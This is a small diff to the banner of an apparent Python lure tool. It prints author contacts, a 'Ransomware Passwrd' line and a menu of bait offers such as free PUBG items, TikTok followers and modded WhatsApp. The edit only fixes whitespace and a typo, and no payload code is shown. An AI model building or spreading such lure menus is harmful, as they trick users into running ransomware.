@@ -41,6 +41,7 @@ print ( """\033[1;31m
      \033[1;31m Telegram  :\033[1;32m  https://t.me/txrtm
      \033[1;31m Tele Team :\033[1;32m  https://t.me/+EHo65POl1yA2ZjA0
      \033[1;31m Gitub     :\033[1;32m  https://github.com/bohaydar
+     
                \033[0;101m\033[1;34m Ransomware Passwrd \033[1;32m : 10203040506070 \033[0;32m
      \033[1;36m
     _____________________________________________________________
@@ -49,7 +50,7 @@ print ( """\033[1;31m
   \033[1;32m    [1] \033[1;31m Termux Pro\033[1;32m   [2]\033[1;31m Play Store Pro\033[1;32m [3]\033[1;31m Yala Lodo mod
   \033[1;32m    [4] \033[1;31m Pubg Us Free\033[1;32m [5]\033[1;31m Update System\033[1;32m  [6]\033[1;31m Tiktok followers
   \033[1;32m    [7] \033[1;31m Telegram Plus\033[1;32m[8]\033[1;31m GB WhatsApp\033[1;32m    [9]\033[1;31m Ff dimond Free
-  \033[1;32m    [10]\033[1;31m Instgram Gold\033[1;32m[00]\033[1;31m1Info Tool\033[1;32m     [xx]\033[1;31m Exit The Tool
+  \033[1;32m    [10]\033[1;31m Instgram Gold\033[1;32m[00]\033[1;31mInfo Tool\033[1;32m     [xx]\033[1;31m Exit The Tool
   \033[1;36m
     _____________________________________________________________
    |_____________________________________________________________|
